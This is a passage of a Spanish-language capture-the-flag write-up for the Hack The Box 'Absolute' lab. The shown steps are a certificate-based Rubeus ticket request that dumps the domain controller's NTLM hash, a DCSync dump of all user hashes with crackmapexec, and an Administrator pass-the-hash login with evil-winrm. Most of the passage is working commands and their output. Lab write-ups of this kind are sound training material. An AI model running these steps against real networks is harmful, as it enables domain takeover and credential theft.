b1Z6/u2PYv4NL5BE+5k9A/W96GmnxV0SR8Rb0qUqLL+kaLxO6bqcGv7eCLjUJGaizmnu6Bvq5Ag+5r69yK+8kIZDKrc2j8AXD6QhgMnwCj+NEKRXrjAoztjLIUHbHCOl+tuXUrdY5Q9ON0FYZXHF9eVUVZY5Vy6jWdXJ/mf0Ka2kYgFk5zg2LcY591xap8LDdEylSVbSm2O8a59BO2DCh7Ir6rAevjCX6lz/6CWddGy+cc3pUn/hF8uta5Jy2x2fz7aoSxIP0xvr1zqKd/xnT7uVl4vI08WxQ9GkAqsxiiL3iRBTcXjqYQrb04GzaHDlfGfe6pHHf916nEunBSxPImDdLXZUPoRZa9WZMIZv5lz1U6Lpig6rNSnPicnDsVWntpHSkIXflfDH4Z4mOPHp6cE02teueyLKLw6rL+9Gf+TydFepexHvevGpCUZ0+Bc4mWegCiurjxsTWDkwm0UXH6yeV3pWaAXx/DnjHOs8oC4zXZsvpTRrj8y+MxzydRIvICW7tgFsn2SCymXzKEyZLmt2i7zX6HmHidJkBGCvXc91uEsM8weTpnUDOH9bRyPKKF1tZ8MmrR/ctoGe0K4G8jlDbppi8GF+b721OCqa516KNRBelz0aLbzzpXhDyYOP3wg79LhgmKDHD29nu9jhxanpgVVMKmlofWRCDnd98wOzAfMAcGBSsOAwIaBBQcOJkUke+uvw+KB8hgeGO2u6lhlAQURUO5klsyKwtYjhMHRXPcKcX2d4ICAgfQ /password:"7014f9a7-01c9-4c8e-bad1-5e4996f5aa40" /getcredentials /show
+
+PS C:\Users\winrm_user\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al final se nos muestra un comando de <code class="language-plaintext highlighter-rouge">Rubeus</code> donde hace uso del certificado junto con el parametro <code class="language-plaintext highlighter-rouge">/getcredentials</code> para dumpear la credencial de la maquina <code class="language-plaintext highlighter-rouge">DC$</code> al ejecutar el comando además de crearnos un <code class="language-plaintext highlighter-rouge">TGT</code> como DC$ nos muestra el hash <code class="language-plaintext highlighter-rouge">NT</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\winrm_user\Documents> </span><span class="am">.\Rubeus.exe </span><span class="p">asktgt /user:DC$ /certificate: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 /password:</span><span class="az">"7014f9a7-01c9-4c8e-bad1-5e4996f5aa40"</span><span class="p"> /getcredentials /show
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.3
+
+[*] Action: Ask TGT
+
+[*] Using PKINIT with etype rc4_hmac and subject: CN=DC$
+[*] Building AS-REQ (w/ PKINIT preauth) for: 'absolute.htb\DC$'
+[*] Using domain controller: fe80::64bf:5f:a470:c807%11:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      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
+      Lmh0Yg==
+
+  ServiceName              :  krbtgt/absolute.htb
+  ServiceRealm             :  ABSOLUTE.HTB
+  UserName                 :  DC$
+  UserRealm                :  ABSOLUTE.HTB
+  StartTime                :  5/19/2023 11:36:02 PM
+  EndTime                  :  5/20/2023 9:36:02 AM
+  RenewTill                :  5/30/2023 11:36:02 PM
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType                  :  rc4_hmac
+  Base64(key)              :  o5HhLu6Vs+YPeTcQWu0bgQ==
+  ASREP (key)              :  5234FF109A64758AB959CA3BC3EBA611
+
+[*] Getting credentials using U2U
+
+  CredentialInfo         :
+    Version              : 0
+    EncryptionType       : rc4_hmac
+    CredentialData       :
+      CredentialCount    : 1
+       NTLM              : A7864AB463177ACB9AEC553F18F42577
+
+PS C:\Users\winrm_user\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ya que nos autenticamos como <code class="language-plaintext highlighter-rouge">DC$</code> y la maquina tiene privilegios <code class="language-plaintext highlighter-rouge">DCSync</code> sobre el dominio podemos dumpear el <code class="language-plaintext highlighter-rouge">ntds.dit</code> para ver los hashes de todos los usuarios</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb absolute.htb -u DC$ -H A7864AB463177ACB9AEC553F18F42577 --ntds drsuapi
+</span><span class="az">SMB         </span><span class="p">absolute.htb    445    DC               </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
+</span><span class="az">SMB         </span><span class="p">absolute.htb    445    DC               </span><span class="ve">[+] </span><span class="p">absolute.htb\DC$:A7864AB463177ACB9AEC553F18F42577
+</span><span class="az">SMB         </span><span class="p">absolute.htb    445    DC               </span><span class="ro">[-] </span><span class="p">RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
+</span><span class="az">SMB         </span><span class="p">absolute.htb    445    DC               </span><span class="ve">[+] </span><span class="p">Dumping the NTDS, this could take a while so go grab a redbull...
+</span><span class="az">SMB         </span><span class="p">absolute.htb    445    DC               </span><span class="am">Administrator\Administrator:500:aad3b435b51404eeaad3b435b51404ee:1f4a6093623653f6488d5aa24c75f2ea:::  
+</span><span class="az">SMB         </span><span class="p">absolute.htb    445    DC               </span><span class="am">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span><span class="az">SMB         </span><span class="p">absolute.htb    445    DC               </span><span class="am">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3ca378b063b18294fa5122c66c2280d4:::
+</span><span class="az">SMB         </span><span class="p">absolute.htb    445    DC               </span><span class="am">J.Roberts:1103:aad3b435b51404eeaad3b435b51404ee:7d6b7511772593b6d0a3d2de4630025a:::
+</span><span class="az">SMB         </span><span class="p">absolute.htb    445    DC               </span><span class="am">M.Chaffrey:1104:aad3b435b51404eeaad3b435b51404ee:13a699bfad06afb35fa0856f69632184:::
+</span><span class="az">SMB         </span><span class="p">absolute.htb    445    DC               </span><span class="am">D.Klay:1105:aad3b435b51404eeaad3b435b51404ee:21c95f594a80bf53afc78114f98fd3ab:::
+</span><span class="az">SMB         </span><span class="p">absolute.htb    445    DC               </span><span class="am">s.osvald:1106:aad3b435b51404eeaad3b435b51404ee:ab14438de333bf5a5283004f660879ee:::
+</span><span class="az">SMB         </span><span class="p">absolute.htb    445    DC               </span><span class="am">j.robinson:1107:aad3b435b51404eeaad3b435b51404ee:0c8cb4f338183e9e67bbc98231a8e59f:::
+</span><span class="az">SMB         </span><span class="p">absolute.htb    445    DC               </span><span class="am">n.smith:1108:aad3b435b51404eeaad3b435b51404ee:ef424db18e1ae6ba889fb12e8277797d:::
+</span><span class="az">SMB         </span><span class="p">absolute.htb    445    DC               </span><span class="am">m.lovegod:1109:aad3b435b51404eeaad3b435b51404ee:a22f2835442b3c4cbf5f24855d5e5c3d:::
+</span><span class="az">SMB         </span><span class="p">absolute.htb    445    DC               </span><span class="am">l.moore:1110:aad3b435b51404eeaad3b435b51404ee:0d4c6dccbfacbff5f8b4b31f57c528ba:::
+</span><span class="az">SMB         </span><span class="p">absolute.htb    445    DC               </span><span class="am">c.colt:1111:aad3b435b51404eeaad3b435b51404ee:fcad808a20e73e68ea6f55b268b48fe4:::
+</span><span class="az">SMB         </span><span class="p">absolute.htb    445    DC               </span><span class="am">s.johnson:1112:aad3b435b51404eeaad3b435b51404ee:b922d77d7412d1d616db10b5017f395c:::
+</span><span class="az">SMB         </span><span class="p">absolute.htb    445    DC               </span><span class="am">d.lemm:1113:aad3b435b51404eeaad3b435b51404ee:e16f7ab64d81a4f6fe47ca7c21d1ea40:::
+</span><span class="az">SMB         </span><span class="p">absolute.htb    445    DC               </span><span class="am">svc_smb:1114:aad3b435b51404eeaad3b435b51404ee:c31e33babe4acee96481ff56c2449167:::
+</span><span class="az">SMB         </span><span class="p">absolute.htb    445    DC               </span><span class="am">svc_audit:1115:aad3b435b51404eeaad3b435b51404ee:846196aab3f1323cbcc1d8c57f79a103:::
+</span><span class="az">SMB         </span><span class="p">absolute.htb    445    DC               </span><span class="am">winrm_user:1116:aad3b435b51404eeaad3b435b51404ee:8738c7413a5da3bc1d083efc0ab06cb2:::
+</span><span class="az">SMB         </span><span class="p">absolute.htb    445    DC               </span><span class="am">DC$:1000:aad3b435b51404eeaad3b435b51404ee:a7864ab463177acb9aec553f18f42577:::</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos usar simplemente el <code class="language-plaintext highlighter-rouge">hash</code> NT del usuario <code class="language-plaintext highlighter-rouge">Administrator</code> y conectarnos con <code class="language-plaintext highlighter-rouge">evil-winrm</code> mediante un passthehash, finalmente podemos leer la <code class="language-plaintext highlighter-rouge">flag</code> de root</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ evil-winrm </span><span class="p">-i absolute.htb -u Administrator -H 1f4a6093623653f6488d5aa24c75f2ea  
+PS C:\Users\Administrator\Documents> </span><span class="am">whoami</span><span class="p">
+absolute\administrator
+PS C:\Users\Administrator\Documents> </span><span class="am">type</span><span class="p"> ..\Desktop\root.txt
+1d2**************************e16
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2023 - GatoGamer1155</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
